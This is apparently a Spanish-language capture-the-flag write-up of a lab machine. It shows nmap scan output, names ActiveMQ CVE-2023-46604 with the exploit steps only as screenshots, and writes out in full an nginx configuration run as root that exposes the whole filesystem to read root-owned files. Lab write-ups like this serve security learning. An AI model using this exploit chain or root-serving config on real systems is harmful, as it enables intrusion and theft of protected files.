### nmap
```python
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1234/tcp  open  hotline?
1337/tcp  open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Index of /
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
1883/tcp  open  mqtt
```

### Enumeracion del puerto 80
![[Pasted image 20240106222122.png]]
tenemos información sobre la pagina. esto es importante para poder buscar vulnerabilidades o exploits
### buscamos información sobre el framework
![[Pasted image 20240106222624.png]]
searchsploit nos indica que tenemos varios sploits  para poder vulnerar este framework asi que haremos una busqueda en internet

### CVE-2023-46604
![[Pasted image 20240106224146.png]]

### ejecutamos el exploit
abrimos un servidor en python para poder hacer el llamado del poc.xml y ejecutamos
![[Pasted image 20240106231746.png]]
tenemos conexión 

### Escalada de privilegios 
![[Pasted image 20240106232230.png]]

### copiamos el archivo nginx.conf al directorio tmp para poder editarlo
```
user root;
events {
	worker_connections 768;
}
http {
	server {
		listen 9001;
		root /;
		autoindex on;
	}
}
```
si nos da un error podemos cambiar el puerto de listen por otro
![[Pasted image 20240107003240.png]]
### finalmente podemos hacer un curl al localhost apuntando al puerto listen que especificamos y al directorio donde buscaremos el archivo que necesitamos
